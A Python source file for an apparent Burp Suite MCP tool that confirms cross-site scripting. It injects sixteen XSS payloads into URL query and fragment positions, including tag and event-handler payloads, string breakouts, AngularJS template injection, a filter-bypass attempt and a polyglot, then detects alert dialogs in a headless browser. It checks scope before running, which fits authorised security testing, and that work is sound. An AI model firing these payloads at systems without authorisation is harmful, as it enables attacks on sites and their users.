"""probe_xss_executed — binary XSS execution proof via headless dialog hook.

Standard XSS detection matches the payload in the response body — but
reflection ≠ execution. Real triagers reject "reflected in HTML attribute"
findings without a working PoC.

This tool injects a payload that calls alert/confirm/prompt and hooks
page.on("dialog") in CloakBrowser. A captured dialog event is BINARY
PROOF the payload reached an executable context — DOM XSS / reflected XSS /
stored XSS / template-injection alike. The dialog message contains a unique
marker so we know which probe triggered it.

Routes through Burp's proxy (CloakBrowser is launched with proxy=Burp).
"""

import asyncio
import time
from urllib.parse import urlencode, urlparse, parse_qsl

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp.tools.browser import _ensure_browser
from burpsuite_mcp.tools.testing._verdict import error_verdict, make_verdict


# Payload variants: each calls a dialog with the marker. Wrapped for different contexts.
def _payload_variants(marker: str) -> list[tuple[str, str]]:
    """(label, payload) — each payload calls alert/confirm/prompt with the marker."""
    return [
        # HTML context
        ("script-tag", f"<script>alert('{marker}')</script>"),
        ("img-onerror", f"<img src=x onerror=alert('{marker}')>"),
        ("svg-onload", f"<svg/onload=alert('{marker}')>"),
        ("body-onload", f"<body onload=alert('{marker}')>"),
        ("input-onfocus-autofocus", f"<input autofocus onfocus=alert('{marker}')>"),
        # Attribute context
        ("attr-break-quoted", f"\"><script>alert('{marker}')</script>"),
        ("attr-break-event", f"\" onerror=alert('{marker}') x=\""),
        # JS string context
        ("js-string-double", f"\";alert('{marker}');//"),
        ("js-string-single", f"';alert('{marker}');//"),
        ("js-string-backtick", f"`;alert('{marker}');//"),
        ("js-template-literal", f"${{alert('{marker}')}}"),
        # URL / javascript: scheme
        ("javascript-scheme", f"javascript:alert('{marker}')"),
        # SSTI-on-client (AngularJS, Vue)
        ("angular-csti", "{{constructor.constructor(\"alert('" + marker + "')\")()}}"),
        ("handlebars", "{{= alert('" + marker + "') }}"),
        # DOMPurify bypass-ish
        ("mathml-img", f"<math><mi//xlink:href=\"data:x,<script>alert('{marker}')</script>\">"),
        # Polyglot
        ("polyglot", f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{marker}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{marker}')//>\\x3e"),
    ]


def _inject_into_url(base_url: str, param: str, payload: str, in_kind: str) -> str:
    """Place the payload into the URL per in_kind: 'query', 'fragment', 'fragment_kv'."""
    parsed = urlparse(base_url)
    if in_kind == "query":
        q = dict(parse_qsl(parsed.query, keep_blank_values=True))
        q[param] = payload
        new_q = urlencode(q, doseq=True)
        return parsed._replace(query=new_q).geturl()
    elif in_kind == "fragment":
        return parsed._replace(fragment=payload).geturl()
    elif in_kind == "fragment_kv":
        return parsed._replace(fragment=f"{param}={payload}").geturl()
    else:
        raise ValueError(f"unknown in_kind: {in_kind}")


def register(mcp: FastMCP):

    @mcp.tool()
    async def probe_xss_executed(
        url: str,
        param: str = "q",
        in_kinds: list[str] | None = None,
        variants: list[str] | None = None,
        wait_after_ms: int = 1500,
    ) -> dict:
        """Headless-browser XSS execution proof via dialog event capture.

        Injects payloads that call alert()/confirm()/prompt() with a unique marker.
        Hooks page.on("dialog") — a captured dialog == binary execution proof.

        Args:
            url: Target URL (with placeholder param value if relevant).
            param: Parameter name to inject into (default 'q').
            in_kinds: Where to inject — list of 'query', 'fragment', 'fragment_kv'. Default: all.
            variants: Payload variant labels to test (default: all 17).
            wait_after_ms: How long to wait after navigation for the dialog to fire.

        Returns: list of (variant, in_kind, marker_seen) tuples. Marker-seen entries
        are CONFIRMED XSS execution.
        """
        if in_kinds is None:
            in_kinds = ["query", "fragment", "fragment_kv"]
        all_variants = _payload_variants("PLACEHOLDER")
        if variants:
            wanted = set(variants)
            all_variants = [v for v in all_variants if v[0] in wanted]

        # Lazy import so non-browser test envs don't choke
        from burpsuite_mcp import client as _client
        scope = await _client.check_scope(url)
        if "error" in scope:
            return error_verdict(f"scope check failed: {scope['error']}",
                                 vuln_type="xss_executed")
        if not scope.get("in_scope", False):
            return error_verdict(f"{url} not in scope",
                                 vuln_type="xss_executed")

        _b, _ctx, page = await _ensure_browser()

        lines = [f"probe_xss_executed url={url} param={param}", ""]
        confirmed: list[dict] = []

        # Reset any prior dialog handler so this session is clean
        dialog_events: list[str] = []

        async def on_dialog(d):
            dialog_events.append(d.message)
            try:
                await d.dismiss()
            except Exception:
                pass

        page.on("dialog", lambda d: asyncio.create_task(on_dialog(d)))

        for label, _raw in all_variants:
            for in_kind in in_kinds:
                marker = f"swkXSS{int(time.time() * 1000) % 100_000_000:x}_{label[:8]}_{in_kind[:5]}"
                # Rebuild payload with this run's marker
                payloads = [p for (lbl, p) in _payload_variants(marker) if lbl == label]
                if not payloads:
                    continue
                payload = payloads[0]
                try:
                    target = _inject_into_url(url, param, payload, in_kind)
                except Exception as e:
                    lines.append(f"  [{label} via {in_kind}] URL build error: {e}")
                    continue

                dialog_events.clear()
                try:
                    await page.goto(target, wait_until="domcontentloaded", timeout=15000)
                except Exception as e:
                    lines.append(f"  [{label} via {in_kind}] nav error: {type(e).__name__}")
                    continue

                # Wait for any post-load JS to execute and fire dialog
                await asyncio.sleep(wait_after_ms / 1000.0)

                # Also click first visible same-origin link — many SPA-routed
                # DOM-XSS only fire after second navigation.
                try:
                    await page.evaluate("""() => {
                        const a = document.querySelector('a[href]');
                        if (a) a.click();
                    }""")
                    await asyncio.sleep(0.5)
                except Exception:
                    pass

                hit = any(marker in msg for msg in dialog_events)
                if hit:
                    matching = [m for m in dialog_events if marker in m]
                    confirmed.append({
                        "variant": label,
                        "in_kind": in_kind,
                        "target": target,
                        "dialog_text": matching[0],
                    })
                    lines.append(f"  [{label} via {in_kind}] *** EXECUTED *** dialog={matching[0][:80]!r}")
                else:
                    msg = "" if not dialog_events else f" (other dialogs: {dialog_events[:1]!r})"
                    lines.append(f"  [{label} via {in_kind}] no-execute{msg}")

        lines.append("")
        lines.append("--- Summary ---")
        if confirmed:
            lines.append(f"CONFIRMED XSS EXECUTIONS: {len(confirmed)}")
            for c in confirmed:
                lines.append(f"  variant={c['variant']} in={c['in_kind']}")
                lines.append(f"    target: {c['target']}")
                lines.append(f"    dialog: {c['dialog_text'][:120]!r}")
            lines.append("\nThis is binary execution proof. assess_finding should treat as q5_evidence: CERTAIN.")
            verdict, confidence = "CONFIRMED", 0.95
            ev = (f"XSS executed: {len(confirmed)} variant(s) fired dialog "
                  f"(binary proof via page.on('dialog') hook)")
        else:
            lines.append("No execution confirmed across tested variants. Reflection alone is NOT proof — re-try with different param or in_kind.")
            verdict, confidence = "FAILED", 0.10
            ev = f"no dialog fired across {len(all_variants)} variants × {len(in_kinds)} injection sites"

        return make_verdict(
            verdict, confidence, ev,
            vuln_type="xss_executed",
            details={
                "url": url,
                "param": param,
                "variants_tested": len(all_variants),
                "in_kinds": in_kinds,
                "confirmed": confirmed,
            },
            summary="\n".join(lines),
        )
